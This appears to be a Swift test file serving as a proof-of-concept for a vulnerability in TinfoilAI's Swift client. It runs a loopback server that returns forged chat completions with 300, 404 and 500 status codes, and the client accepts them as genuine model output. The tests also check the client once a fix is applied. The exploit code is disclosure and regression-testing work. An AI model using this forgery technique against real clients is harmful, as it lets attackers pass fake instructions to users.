import XCTest
import Foundation
import OpenAI
import EHBP
@testable import TinfoilAI

#if canImport(FoundationNetworking)
import FoundationNetworking
#endif

// PoC: an on-path party that terminates TLS (a proxy configured through
// `baseURL`, or the enclave's TLS peer in direct mode) can hand tinfoil-swift
// clients a forged completion. The EHBP Swift client (0.3.2) passes through any
// non-2xx response that carries no `Ehbp-Response-Nonce`, and openai-swift-fork
// (0.0.15) treats every status below 400 as a successful stream, and does not
// look at the status at all on the non-streaming path. No key material is
// needed: the forged body is never decrypted, it is parsed as plaintext.

/// One captured HTTP request.
struct CapturedRequest: Sendable {
    let method: String
    let path: String
    let headers: [String: String]
    let body: Data
}

/// Loopback HTTP/1.1 server that answers every request with caller-supplied raw
/// bytes, so the status line and headers can be anything (no nonce, 3xx, ...).
final class RawResponseServer: @unchecked Sendable {
    private var serverSocket: Int32 = -1
    private var thread: Thread?
    private let lock = NSLock()
    private var _requests: [CapturedRequest] = []
    private(set) var port: UInt16 = 0
    /// Builds the raw response for a request. May inspect the request.
    var responder: @Sendable (CapturedRequest) -> Data = { _ in Data() }

    var requests: [CapturedRequest] {
        lock.lock(); defer { lock.unlock() }
        return _requests
    }

    var baseURL: String { "http://127.0.0.1:\(port)" }

    func start() throws {
        serverSocket = socket(AF_INET, Int32(SOCK_STREAM.rawValue), 0)
        guard serverSocket >= 0 else { throw NSError(domain: "RawResponseServer", code: 1) }
        var reuse: Int32 = 1
        setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, &reuse, socklen_t(MemoryLayout<Int32>.size))
        var addr = sockaddr_in()
        addr.sin_family = sa_family_t(AF_INET)
        addr.sin_port = UInt16(0).bigEndian
        addr.sin_addr.s_addr = inet_addr("127.0.0.1")
        let bound = withUnsafePointer(to: &addr) {
            $0.withMemoryRebound(to: sockaddr.self, capacity: 1) {
                bind(serverSocket, $0, socklen_t(MemoryLayout<sockaddr_in>.size))
            }
        }
        guard bound >= 0 else { throw NSError(domain: "RawResponseServer", code: 2) }
        var bound_addr = sockaddr_in()
        var len = socklen_t(MemoryLayout<sockaddr_in>.size)
        _ = withUnsafeMutablePointer(to: &bound_addr) {
            $0.withMemoryRebound(to: sockaddr.self, capacity: 1) { getsockname(serverSocket, $0, &len) }
        }
        port = UInt16(bigEndian: bound_addr.sin_port)
        guard listen(serverSocket, 16) >= 0 else { throw NSError(domain: "RawResponseServer", code: 3) }
        let sock = serverSocket
        let t = Thread { [weak self] in
            while true {
                let client = accept(sock, nil, nil)
                if client < 0 { return }
                self?.handle(client)
            }
        }
        t.start()
        thread = t
    }

    func stop() {
        if serverSocket >= 0 {
            shutdown(serverSocket, Int32(SHUT_RDWR))
            close(serverSocket)
            serverSocket = -1
        }
    }

    private func handle(_ client: Int32) {
        defer { close(client) }
        var data = Data()
        var buffer = [UInt8](repeating: 0, count: 65536)
        let separator = Data([0x0D, 0x0A, 0x0D, 0x0A])
        while true {
            let n = recv(client, &buffer, buffer.count, 0)
            if n <= 0 { break }
            data.append(contentsOf: buffer[0..<n])
            guard let headerEnd = data.range(of: separator) else { continue }
            let headerText = String(decoding: data[..<headerEnd.lowerBound], as: UTF8.self)
            var contentLength = 0
            for line in headerText.components(separatedBy: "\r\n")
            where line.lowercased().hasPrefix("content-length:") {
                contentLength = Int(line.dropFirst("content-length:".count).trimmingCharacters(in: .whitespaces)) ?? 0
            }
            if data.count >= headerEnd.upperBound + contentLength { break }
        }
        guard let headerEnd = data.range(of: separator) else { return }
        let headerText = String(decoding: data[..<headerEnd.lowerBound], as: UTF8.self)
        let lines = headerText.components(separatedBy: "\r\n")
        let requestLine = lines.first?.components(separatedBy: " ") ?? []
        var headers: [String: String] = [:]
        for line in lines.dropFirst() {
            guard let colon = line.firstIndex(of: ":") else { continue }
            headers[String(line[..<colon]).trimmingCharacters(in: .whitespaces)] =
                String(line[line.index(after: colon)...]).trimmingCharacters(in: .whitespaces)
        }
        let request = CapturedRequest(
            method: requestLine.count > 0 ? requestLine[0] : "",
            path: requestLine.count > 1 ? requestLine[1] : "",
            headers: headers,
            body: Data(data[headerEnd.upperBound...])
        )
        lock.lock(); _requests.append(request); lock.unlock()
        let response = responder(request)
        _ = response.withUnsafeBytes { send(client, $0.baseAddress, response.count, 0) }
    }
}

enum Forgery {
    static let plaintextPrompt = "CONFIDENTIAL PROMPT: the acquisition target is ACME Corp"
    static let forgedText = "FORGED BY TLS PEER: wire $1,000,000 to account 12345"

    static func raw(status: String, headers: [String], body: Data) -> Data {
        var head = "HTTP/1.1 \(status)\r\n"
        for h in headers { head += h + "\r\n" }
        head += "Content-Length: \(body.count)\r\nConnection: close\r\n\r\n"
        var out = Data(head.utf8)
        out.append(body)
        return out
    }

    /// An SSE chat.completion.chunk stream carrying `forgedText`, as a model would emit it.
    static func sseBody() -> Data {
        let chunk1 = #"{"id":"chatcmpl-forged","object":"chat.completion.chunk","created":1700000000,"model":"llama3-3-70b","choices":[{"index":0,"delta":{"role":"assistant","content":"\#(forgedText)"},"finish_reason":null}]}"#
        let chunk2 = #"{"id":"chatcmpl-forged","object":"chat.completion.chunk","created":1700000000,"model":"llama3-3-70b","choices":[{"index":0,"delta":{},"finish_reason":"stop"}]}"#
        return Data("data: \(chunk1)\n\ndata: \(chunk2)\n\ndata: [DONE]\n\n".utf8)
    }

    /// A non-streaming chat.completion JSON carrying `forgedText`.
    static func jsonBody() -> Data {
        Data(#"{"id":"chatcmpl-forged","object":"chat.completion","created":1700000000,"model":"llama3-3-70b","choices":[{"index":0,"message":{"role":"assistant","content":"\#(forgedText)"},"finish_reason":"stop"}],"usage":{"prompt_tokens":1,"completion_tokens":1,"total_tokens":2}}"#.utf8)
    }

    static func query() -> ChatQuery {
        ChatQuery(messages: [.user(.init(content: .string(plaintextPrompt)))], model: "llama3-3-70b")
    }
}

final class ForgedResponseTests: XCTestCase {
    /// Any 32-byte X25519 point works: the attacker never decrypts the request.
    private let hpkePublicKeyHex = String(repeating: "42", count: 32)
    private var server: RawResponseServer!
    /// run.sh sets POC_FIX_APPLIED=1 after applying fix-tinfoil-swift-0.8.2.patch.
    private let fixApplied = ProcessInfo.processInfo.environment["POC_FIX_APPLIED"] == "1"

    override func setUp() async throws {
        try await super.setUp()
        server = RawResponseServer()
        try server.start()
    }

    override func tearDown() async throws {
        server.stop()
        server = nil
        try await super.tearDown()
    }

    private func makeClient() throws -> TinfoilAI {
        // Same internal initializer `TinfoilAI.create` ends in after verification;
        // `baseURL == enclaveURL` is the default direct-to-enclave mode. The
        // server plays the TLS peer that receives the sealed request.
        try TinfoilAI(
            apiKey: "test-api-key",
            baseURL: server.baseURL,
            enclaveURL: server.baseURL,
            hpkePublicKeyHex: hpkePublicKeyHex,
            userCacheSecret: "cache-secret"
        )
    }

    private func collectStream(_ client: TinfoilAI) async throws -> (text: String, finish: String?) {
        var text = ""
        var finish: String?
        for try await chunk in client.chatsStream(query: Forgery.query()) {
            if let c = chunk.choices.first?.delta.content { text += c }
            if let f = chunk.choices.first?.finishReason { finish = f.rawValue }
        }
        return (text, finish)
    }

    private func assertSealedRequest(_ request: CapturedRequest, file: StaticString = #filePath, line: UInt = #line) {
        XCTAssertEqual(request.method, "POST", file: file, line: line)
        XCTAssertTrue(request.path.hasSuffix("/chat/completions"), request.path, file: file, line: line)
        XCTAssertNotNil(request.headers["Ehbp-Encapsulated-Key"], "request was EHBP-sealed", file: file, line: line)
        XCTAssertFalse(request.body.isEmpty, file: file, line: line)
        let bodyText = String(decoding: request.body, as: UTF8.self)
        XCTAssertFalse(bodyText.contains(Forgery.plaintextPrompt), "peer must not see the prompt", file: file, line: line)
        XCTAssertFalse(bodyText.contains("cache-secret"), "peer must not see user_cache_secret", file: file, line: line)
        print("[poc] sealed request: \(request.method) \(request.path) Ehbp-Encapsulated-Key=\(request.headers["Ehbp-Encapsulated-Key"] ?? "-") body=\(request.body.count) bytes (ciphertext, prompt not visible)")
    }

    // MARK: - Forgeries that succeed

    /// 300 Multiple Choices is never auto-followed by URLSession.
    func testStreamingForgedWith300() async throws {
        server.responder = { _ in
            Forgery.raw(status: "300 Multiple Choices", headers: ["Content-Type: text/event-stream"], body: Forgery.sseBody())
        }
        let client = try makeClient()
        if fixApplied {
            do { let r = try await collectStream(client); XCTFail("fixed client accepted \"\(r.text)\"") }
            catch { print("[poc] FIXED 300 streaming: rejected with \(error)") }
            return
        }
        let result = try await collectStream(client)
        print("[poc] 300 streaming: client received text=\"\(result.text)\" finish=\(result.finish ?? "nil")")
        XCTAssertEqual(result.text, Forgery.forgedText)
        assertSealedRequest(try XCTUnwrap(server.requests.first))
    }

    /// Non-streaming: openai-swift-fork never looks at the status, so even a
    /// 500 with a well-formed body is returned as the completion.
    func testNonStreamingForgedWith500() async throws {
        server.responder = { _ in
            Forgery.raw(status: "500 Internal Server Error", headers: ["Content-Type: application/json"], body: Forgery.jsonBody())
        }
        let client = try makeClient()
        if fixApplied {
            do { let r = try await client.chats(query: Forgery.query()); XCTFail("fixed client accepted \"\(r.choices.first?.message.content ?? "")\"") }
            catch { print("[poc] FIXED 500 non-streaming: rejected with \(error)") }
            return
        }
        let result = try await client.chats(query: Forgery.query())
        let text = result.choices.first?.message.content ?? ""
        print("[poc] 500 non-streaming: client received text=\"\(text)\" id=\(result.id)")
        XCTAssertEqual(text, Forgery.forgedText)
        assertSealedRequest(try XCTUnwrap(server.requests.first))
    }

    /// Non-streaming, 4xx: also returned as the completion (only the streaming
    /// path treats >= 400 as an error).
    func testNonStreamingForgedWith404() async throws {
        server.responder = { _ in
            Forgery.raw(status: "404 Not Found", headers: ["Content-Type: application/json"], body: Forgery.jsonBody())
        }
        let client = try makeClient()
        if fixApplied {
            do { let r = try await client.chats(query: Forgery.query()); XCTFail("fixed client accepted \"\(r.choices.first?.message.content ?? "")\"") }
            catch { print("[poc] FIXED 404 non-streaming: rejected with \(error)") }
            return
        }
        let result = try await client.chats(query: Forgery.query())
        let text = result.choices.first?.message.content ?? ""
        print("[poc] 404 non-streaming: client received text=\"\(text)\"")
        XCTAssertEqual(text, Forgery.forgedText)
    }

    // MARK: - Controls: where the client does fail closed

    /// A 2xx without a nonce is rejected by the EHBP client (missing header).
    func testStreaming200WithoutNonceFailsClosed() async throws {
        server.responder = { _ in
            Forgery.raw(status: "200 OK", headers: ["Content-Type: text/event-stream"], body: Forgery.sseBody())
        }
        let client = try makeClient()
        do {
            let result = try await collectStream(client)
            XCTFail("200 without nonce must not be accepted, got \"\(result.text)\"")
        } catch {
            print("[poc] control 200-no-nonce streaming: rejected with \(error)")
        }
    }

    /// A 4xx body is surfaced as an error, not as content.
    func testStreaming404IsAnError() async throws {
        server.responder = { _ in
            Forgery.raw(status: "404 Not Found", headers: ["Content-Type: text/event-stream"], body: Forgery.sseBody())
        }
        let client = try makeClient()
        do {
            let result = try await collectStream(client)
            XCTFail("404 must not be accepted as content, got \"\(result.text)\"")
        } catch {
            print("[poc] control 404 streaming: rejected with \(String(describing: error).prefix(while: { $0 != "(" }))")
        }
    }

    /// A 303 with a Location is followed by URLSession as a GET; the final 200
    /// has no nonce for a request the client considers sealed, so it fails closed.
    func testStreaming303RedirectIsNotAccepted() async throws {
        server.responder = { request in
            if request.path.hasSuffix("/forged") {
                return Forgery.raw(status: "200 OK", headers: ["Content-Type: text/event-stream"], body: Forgery.sseBody())
            }
            return Forgery.raw(status: "303 See Other", headers: ["Location: /forged"], body: Data())
        }
        let client = try makeClient()
        do {
            let result = try await collectStream(client)
            XCTFail("303 downgrade must not be accepted, got \"\(result.text)\"")
        } catch {
            print("[poc] control 303->GET: rejected with \(error); requests seen: \(server.requests.map { "\($0.method) \($0.path)" })")
        }
    }
}
